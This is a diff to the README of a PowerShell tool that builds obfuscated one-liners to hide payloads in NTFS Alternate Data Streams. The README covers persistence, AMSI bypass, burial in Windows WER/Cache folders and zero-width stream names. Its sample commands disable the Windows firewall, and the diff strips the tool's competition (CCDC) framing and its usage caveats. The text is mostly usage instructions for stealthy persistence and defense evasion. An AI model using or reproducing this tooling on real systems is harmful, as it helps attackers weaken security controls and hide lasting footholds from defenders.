@@ -30,7 +30,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
   -OutputFile /tmp/fw-off.txt
 
-# 2. Standard CCDC op — Advanced stealth, registry persist, 3 redundant instances
+# 2. Standard — Advanced stealth, registry persist, 3 redundant instances
 pwsh src/ADS-OneLiner.ps1 \
   -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
   -Obfuscate Advanced \
@@ -46,7 +46,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -OutputFile /tmp/paranoid.txt
 ```
 
-Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator.
+Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file into PowerShell as Administrator (for task/system level persistence).
 
 ---
 
@@ -58,7 +58,7 @@ Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file 
 |-----------|------|---------|-------------|
 | **Payload Input** | | | |
 | `-Payload 'cmd'` | string | — | Inline PowerShell. Use single quotes in bash. |
-| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables`. |
+| `-PayloadFile /path` | string | — | Read payload from file. Best for `$variables` and multi-line payloads. |
 | `-PayloadAtDeployment` | switch | off | Prompt for payload on Windows target at paste time. |
 | **Stealth Tier** | | | |
 | `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. |
@@ -74,7 +74,7 @@ Then on Windows: paste **OPTION 1** (the base64 one-liner) from the output file 
 | `-Randomize $true\|$false` | bool | tier-implied | Randomize all artifact names. |
 | `-UseDeepPlacement $true\|$false` | bool | tier-implied | Bury ADS in WER/Cache dirs. |
 | `-AttachToExisting $true\|$false` | bool | tier-implied | Attach to existing system file. |
-| `-NoAmsi` | switch | off | Disable AMSI bypass (almost never use). |
+| `-NoAmsi` | switch | off | Disable AMSI bypass (if one desires). |
 | **Stream Naming** | | | |
 | `-ZeroWidthStreams` | switch | tier-implied | ZW Unicode chars in stream names. |
 | `-ZeroWidthMode single\|multi\|hybrid` | string | `single` | ZW character pattern. |
@@ -106,9 +106,9 @@ The `-Obfuscate` parameter is the primary control. Most other evasion parameters
 
 | Tier | Task/File Names | ADS Placement | ZW Streams | Implied Settings | When to Use |
 |------|-----------------|---------------|------------|-----------------|-------------|
-| `None` | Fixed: `SystemOptimization`, `SystemCache.dat` | `C:\ProgramData\` | No | — | **Testing only. Never in competition.** |
+| `None` | Fixed: `SystemOptimization`, `SystemCache.dat` | `C:\ProgramData\` | No | — | **Testing only.** |
 | `Basic` | Word-list random | `C:\ProgramData\` | No | — | Quick deployment, acceptable stealth. |
-| `Advanced` | Word-list random | WER\Cache, Diagnosis | No | Randomize + DeepPlace + Attach | **Default. Standard CCDC.** |
+| `Advanced` | Word-list random | WER\Cache, Diagnosis | No | Randomize + DeepPlace + Attach | **Default.** |
 | `Paranoid` | Word-list random | WER\Cache + attach | Yes | All Advanced + ZeroWidth | Max stealth. Harder to clean up. |
 
 **Override example** (Advanced stealth but disable deep placement):
